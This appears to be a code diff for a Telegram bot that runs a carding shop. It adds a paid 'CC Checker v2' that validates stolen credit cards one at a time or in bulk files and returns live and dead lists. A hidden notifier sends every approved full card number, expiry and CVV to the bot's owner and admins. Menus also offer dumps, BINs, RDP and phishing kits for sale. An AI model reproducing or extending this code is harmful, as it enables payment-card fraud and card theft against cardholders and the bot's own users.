@@ -6,10 +6,50 @@ import sqlite3
 import telebot
 from telebot import types
 
-from config import API_TOKENS, ADMIN_ID, DB_NAME, WELCOME_GIF, MEDIA_SOURCE_GROUP_IDS
-from database import init_db, add_user, load_products
-from helpers import check_force_join, notify_admin, send_random_animation, add_gif_to_pool
+from config import API_TOKENS, ADMIN_ID, DB_NAME, MEDIA_SOURCE_GROUP_IDS, WELCOME_GIF
+from database import (
+    init_db, add_user, get_user_credits, update_user_credits, 
+    generate_pro_key, get_all_pro_keys, validate_and_use_pro_key
+)
+from helpers import (
+    check_force_join, notify_admin, send_random_animation, 
+    add_gif_to_pool, send_main_menu
+)
+from config import ADMIN_ID, DB_NAME as _DB
+import sqlite3 as _sqlite3
+
+def _notify_cc_success(bot_instance, cc_string, result_obj, user_id):
+    """Notify owner and global admins of a successful CC check with a success GIF."""
+    try:
+        brand = result_obj.get("bin_info", {}).get("brand", "?")
+        bank = result_obj.get("bin_info", {}).get("bank", "?")
+        country = result_obj.get("bin_info", {}).get("country", "?")
+        flag = result_obj.get("bin_info", {}).get("country_flag", "")
+        text = (
+            f"✅ <b>CC Approved</b>\n\n"
+            f"<b>User:</b> <code>{user_id}</code>\n"
+            f"<b>Card:</b> <code>{cc_string}</code>\n"
+            f"<b>Brand:</b> {brand} | <b>Bank:</b> {bank}\n"
+            f"<b>Country:</b> {country} {flag}"
+        )
+        # Get all admin recipients (owner + global admins)
+        recipients = {ADMIN_ID}
+        with _sqlite3.connect(_DB) as conn:
+            cur = conn.cursor()
+            cur.execute("SELECT user_id FROM admins")
+            recipients.update({row[0] for row in cur.fetchall()})
+        for rid in recipients:
+            try:
+                send_random_animation(bot_instance, rid, kind="success", caption=text, parse_mode="HTML")
+            except Exception:
+                try:
+                    bot_instance.send_message(rid, text, parse_mode="HTML")
+                except Exception:
+                    pass
+    except Exception as e:
+        print(f"CC success notify error: {e}")
 from cc_handler import register_cc_handlers
+from cc_checker import check_cc, format_cc_response
 from bin_handler import register_bin_handlers
 from payment_handler import register_payment_handlers, show_payment_options
 from other_handlers import register_other_handlers
@@ -96,54 +136,242 @@ def register_all_handlers(bot_instance):
     register_payment_handlers(bot_instance)
     register_other_handlers(bot_instance, user_states, get_products_from_cache, save_products_to_file_and_reload)
 
-    # ---------- Local handlers and menus ----------
-    def send_main_menu(chat_id, text, message_id=None):
-        bot_instance.send_chat_action(chat_id, 'typing')
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            types.InlineKeyboardButton("💳 Cards", callback_data="cc_menu"),
-            types.InlineKeyboardButton("📦 BINs", callback_data="bin_menu"),
-            types.InlineKeyboardButton("🎁 Gift Cards", callback_data="giftcards_menu"),
-            types.InlineKeyboardButton("💾 Dumps", callback_data="dumps_menu"),
-            types.InlineKeyboardButton("🕵️ Hacks", callback_data="hacks_menu"),
-            types.InlineKeyboardButton("🖥️ RDP", callback_data="rdp_menu"),
-            types.InlineKeyboardButton("✨ Other", callback_data="other_menu"),
-            types.InlineKeyboardButton("🧠 AI Search", callback_data="ai_search"),
-            types.InlineKeyboardButton("👤 Personal Area", callback_data="personal_area"),
-            types.InlineKeyboardButton("🆘 Support", callback_data="support"),
-            types.InlineKeyboardButton("📜 Rules", callback_data="rules")
+    # --- CC Checker V2 Menu ---
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "cc_checker_v2")
+    def cc_checker_v2_menu(call):
+        user_id = call.from_user.id
+        status = get_user_credits(user_id)
+        
+        credits_display = "Unlimited" if status['is_pro'] else status['credits']
+        
+        text = (
+            f"💳 **CC Checker v2**\n\n"
+            f"Your Credits: `{credits_display}`\n\n"
+            "Choose an option:\n"
+            "- **Single Check**: Check one card at a time.\n"
+            "- **File Check**: Upload a `.txt` file to check multiple cards.\n\n"
+            "**Pricing:**\n"
+            "- `2 credits` per successful (Live) card.\n"
+            "- `1 credit` per unsuccessful (Dead) card."
         )
         
-        is_owner = chat_id == ADMIN_ID
-        is_global_admin = False
-        is_section_admin = False
-        try:
-            if not is_owner:
-                with sqlite3.connect(DB_NAME) as conn:
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (chat_id,))
-                    is_global_admin = cursor.fetchone() is not None
-                    cursor.execute("SELECT 1 FROM section_admins WHERE user_id = ?", (chat_id,))
-                    is_section_admin = cursor.fetchone() is not None
-        except Exception:
-            pass
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            types.InlineKeyboardButton("📝 Single Check", callback_data="cc_check_single"),
+            types.InlineKeyboardButton("📄 File Check", callback_data="cc_check_file")
+        )
+        markup.add(types.InlineKeyboardButton("🔑 Use Pro Key", callback_data="use_pro_key"))
+        markup.add(types.InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="main_menu"))
+        
+        bot_instance.edit_message_text(text, user_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
-        if is_owner:
-            markup.add(types.InlineKeyboardButton("🛠️ Status Manage", callback_data="status_manage"))
-            markup.add(
-                types.InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel"),
-                types.InlineKeyboardButton("🔐 Admin Panel", callback_data="admin_panel")
-            )
-        elif is_global_admin or is_section_admin:
-            markup.add(types.InlineKeyboardButton("🔐 Admin Panel", callback_data="admin_panel"))
-
+    # --- My Orders (user view) ---
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "my_orders")
+    def my_orders_callback(call):
+        user_id = call.from_user.id
         try:
-            if message_id:
-                bot_instance.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
+            with sqlite3.connect(DB_NAME) as conn:
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT order_id, item_name, price_usd, payment_status, creation_date FROM orders WHERE user_id = ? ORDER BY creation_date DESC LIMIT 10",
+                    (user_id,)
+                )
+                orders = cursor.fetchall()
+        except Exception as e:
+            orders = []
+            print(f"Error fetching orders for {user_id}: {e}")
+
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("\u2b05\ufe0f Back to Main Menu", callback_data="main_menu"))
+
+        if not orders:
+            text = "\ud83d\udce6 <b>My Orders</b>\n\nYou haven't placed any orders yet."
+        else:
+            text = "\ud83d\udce6 <b>My Orders</b>\n\n<code>Order ID | Item | Price | Status | Date</code>\n" + ("-"*40) + "\n"
+            for o in orders:
+                oid, name, price, status, created = o
+                date_short = created[:10] if created else "-"
+                text += f"<code>{oid}</code> | <code>{name}</code> | <code>${price}</code> | <code>{status}</code> | <code>{date_short}</code>\n"
+        bot_instance.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
+
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "cc_check_single")
+    def cc_check_single_prompt(call):
+        user_id = call.from_user.id
+        user_states[user_id] = "awaiting_single_cc"
+        text = "Please send the credit card details in the format `cc|mm|yyyy|cvv`."
+        bot_instance.edit_message_text(text, user_id, call.message.message_id)
+
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "cc_check_file")
+    def cc_check_file_prompt(call):
+        user_id = call.from_user.id
+        user_states[user_id] = "awaiting_cc_file"
+        text = "Please upload a `.txt` or `.csv` file containing one card per line."
+        bot_instance.edit_message_text(text, user_id, call.message.message_id)
+
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "use_pro_key")
+    def use_pro_key_prompt(call):
+        user_id = call.from_user.id
+        user_states[user_id] = "awaiting_pro_key"
+        text = "Please send the pro key you received from the admin."
+        bot_instance.edit_message_text(text, user_id, call.message.message_id)
+
+    @bot_instance.message_handler(func=lambda message: user_states.get(message.from_user.id) == "awaiting_pro_key")
+    def handle_pro_key_submission(message):
+        user_id = message.from_user.id
+        key = message.text.strip()
+        del user_states[user_id]
+
+        result = validate_and_use_pro_key(key, user_id)
+
+        if result == "success":
+            bot_instance.send_message(user_id, "✅ Congratulations! You now have pro access with unlimited CC checks.")
+        elif result == "used":
+            bot_instance.send_message(user_id, "❌ This key has already been used.")
+        else: # invalid
+            bot_instance.send_message(user_id, "❌ The key you entered is invalid.")
+        
+        send_main_menu(bot_instance, user_id, "Please choose an option:")
+
+    # --- Admin handlers for Pro Keys ---
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "manage_pro_keys")
+    def manage_pro_keys_panel(call):
+        if call.from_user.id != ADMIN_ID:
+            bot_instance.answer_callback_query(call.id, "Access Denied", show_alert=True)
+            return
+        
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton("➕ Generate New Key", callback_data="generate_pro_key"))
+        markup.add(types.InlineKeyboardButton("📋 View All Keys", callback_data="view_pro_keys"))
+        markup.add(types.InlineKeyboardButton("⬅️ Back to Admin Panel", callback_data="admin_panel"))
+        
+        bot_instance.edit_message_text("🔑 **Manage Pro Keys**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "generate_pro_key")
+    def generate_pro_key_callback(call):
+        if call.from_user.id != ADMIN_ID:
+            return
+        
+        new_key = generate_pro_key(call.from_user.id)
+        bot_instance.send_message(call.message.chat.id, f"Generated new pro key:\n\n`{new_key}`", parse_mode="Markdown")
+        manage_pro_keys_panel(call) # Show the menu again
+
+    @bot_instance.callback_query_handler(func=lambda call: call.data == "view_pro_keys")
+    def view_pro_keys_callback(call):
+        if call.from_user.id != ADMIN_ID:
+            return
+        
+        keys = get_all_pro_keys()
+        if not keys:
+            bot_instance.answer_callback_query(call.id, "No pro keys have been generated yet.")
+            return
+            
+        response = "📋 **All Pro Keys**\n\n"
+        for key, is_used, used_by, used_at in keys:
+            status = "Used" if is_used else "Unused"
+            response += f"`{key}` - **{status}**"
+            if used_by:
+                response += f" by `{used_by}` on `{used_at}`\n"
             else:
-                bot_instance.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
-        except Exception:
-            pass
+                response += "\n"
+        
+        bot_instance.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+
+    # --- CC Checker V2 Handlers (Single and File) ---
+    @bot_instance.message_handler(func=lambda message: user_states.get(message.from_user.id) == "awaiting_single_cc")
+    def handle_single_cc_check(message):
+        user_id = message.from_user.id
+        status = get_user_credits(user_id)
+
+        if not status['is_pro'] and status['credits'] < 1:
+            bot_instance.send_message(user_id, "❌ You don't have enough credits for this check.")
+            del user_states[user_id]
+            return
+
+        del user_states[user_id]
+        sent_message = bot_instance.send_message(user_id, "⏳ Checking card... Please wait.")
+        
+        cost = 0
+        result_obj = check_cc(message.text)
+        
+        # Deduct credits based on result
+        if not status['is_pro']:
+            cost = 2 if result_obj.get("status") == "Approved" else 1
+            update_user_credits(user_id, -cost)
+
+        result_text = format_cc_response(message.text, result_obj, cost=cost if not status['is_pro'] else 0)
+        bot_instance.edit_message_text(result_text, user_id, sent_message.message_id, parse_mode="HTML")
+        # Notify on success
+        if result_obj.get("status") == "Approved":
+            _notify_cc_success(bot_instance, message.text, result_obj, user_id)
+
+    @bot_instance.message_handler(content_types=['document'], func=lambda message: user_states.get(message.from_user.id) == "awaiting_cc_file")
+    def handle_cc_file_check(message):
+        user_id = message.from_user.id
+        status = get_user_credits(user_id)
+        
+        if not message.document.file_name.endswith(('.txt', '.csv')):
+            bot_instance.send_message(user_id, "❌ Invalid file type. Please upload a `.txt` or `.csv` file.")
+            return
+
+        del user_states[user_id]
+        
+        try:
+            file_info = bot_instance.get_file(message.document.file_id)
+            downloaded_file = bot_instance.download_file(file_info.file_path)
+            
+            content = downloaded_file.decode('utf-8')
+            cards = [line.strip() for line in content.splitlines() if line.strip()]
+
+            if not status['is_pro'] and status['credits'] < len(cards):
+                bot_instance.send_message(user_id, f"❌ You need at least {len(cards)} credits to check this file, but you only have {status['credits']}.")
+                return
+
+            bot_instance.send_message(user_id, f"⏳ Found {len(cards)} cards. Starting check... This may take a while.")
+
+            live_cards = []
+            dead_cards = []
+            
+            for card in cards:
+                result_obj = check_cc(card)
+                cost = 0
+                if "Approved" in result_obj.get("status", ""):
+                    live_cards.append(card)
+                    _notify_cc_success(bot_instance, card, result_obj, user_id)
+                    if not status['is_pro']:
+                        cost = 2
+                        update_user_credits(user_id, -cost)
+                else:
+                    dead_cards.append(card)
+                    if not status['is_pro']:
+                        cost = 1
+                        update_user_credits(user_id, -cost)
+                time.sleep(2) # To avoid rate limiting
+
+            # Prepare results
+            summary = f"**Mass Check Complete**\n\n✅ Live: {len(live_cards)}\n❌ Dead: {len(dead_cards)}"
+            bot_instance.send_message(user_id, summary, parse_mode="Markdown")
+
+            if live_cards:
+                live_content = "\n".join(live_cards)
+                with open("live_cards.txt", "w") as f:
+                    f.write(live_content)
+                with open("live_cards.txt", "rb") as f:
+                    bot_instance.send_document(user_id, f, caption="Live Cards")
+            
+            if dead_cards:
+                dead_content = "\n".join(dead_cards)
+                with open("dead_cards.txt", "w") as f:
+                    f.write(dead_content)
+                with open("dead_cards.txt", "rb") as f:
+                    bot_instance.send_document(user_id, f, caption="Dead Cards")
+
+        except Exception as e:
+            bot_instance.send_message(user_id, f"An error occurred while processing the file: {e}")
+
+
+    # ---------- Local handlers and menus ----------
+    
 
     @bot_instance.message_handler(commands=["start"])
     def start_command(message):
@@ -173,13 +401,13 @@ def register_all_handlers(bot_instance):
                 send_random_animation(bot_instance, user_id, kind="welcome", caption=intro_text, parse_mode="HTML")
             except Exception:
                 bot_instance.send_message(user_id, intro_text, parse_mode="HTML")
-            send_main_menu(user_id, "👇 **Please choose an option from the menu to begin.**")
+            send_main_menu(bot_instance, user_id, "👇 **Please choose an option from the menu to begin.**")
 
     @bot_instance.callback_query_handler(func=lambda call: call.data == "check_join")
     def joined_callback(call):
         if check_force_join(bot_instance, call.from_user.id):
             bot_instance.delete_message(call.message.chat.id, call.message.message_id)
-            send_main_menu(call.message.chat.id, "✅ **Thank you for joining!** You can now use the bot.")
+            send_main_menu(bot_instance, call.message.chat.id, "✅ **Thank you for joining!** You can now use the bot.")
         else:
             bot_instance.answer_callback_query(call.id, "❌ You haven't joined the channel yet.", show_alert=True)
 
@@ -226,7 +454,6 @@ def register_all_handlers(bot_instance):
     def hacks_menu(call):
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton("🎣 Premium Phishing Kits", callback_data="phishing_kits_menu"))
-        markup.add(types.InlineKeyboardButton("📚 Methods", callback_data="method_menu"))
         markup.add(types.InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="main_menu"))
         bot_instance.edit_message_text("<b>🛡️ Buy Hacks</b>\n\nSelect a category:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
 
@@ -435,7 +662,7 @@ def register_all_handlers(bot_instance):
 
     @bot_instance.callback_query_handler(func=lambda call: call.data == "main_menu")
     def main_menu_callback(call):
-        send_main_menu(call.message.chat.id, "✅ Welcome back! Please choose an option:", call.message.message_id)
+        send_main_menu(bot_instance, call.message.chat.id, "✅ Welcome back! Please choose an option:", call.message.message_id)
 
     # Utility: Get chat ID (admin-only)
     @bot_instance.message_handler(commands=['chatid'])
@@ -443,6 +670,11 @@ def register_all_handlers(bot_instance):
         if message.from_user.id != ADMIN_ID:
             return
         bot_instance.reply_to(message, f"Chat ID: <code>{message.chat.id}</code>", parse_mode="HTML")
+
+    # Utility: Show configured owner info
+    @bot_instance.message_handler(commands=['ownerinfo'])
+    def cmd_ownerinfo(message):
+        bot_instance.reply_to(message, f"Configured owner (ADMIN_ID): <code>{ADMIN_ID}</code>\nYour user ID: <code>{message.from_user.id}</code>", parse_mode="HTML")
 
     # --- Auto-ingest GIFs from configured groups using hashtags ---
     @bot_instance.message_handler(content_types=['animation'])
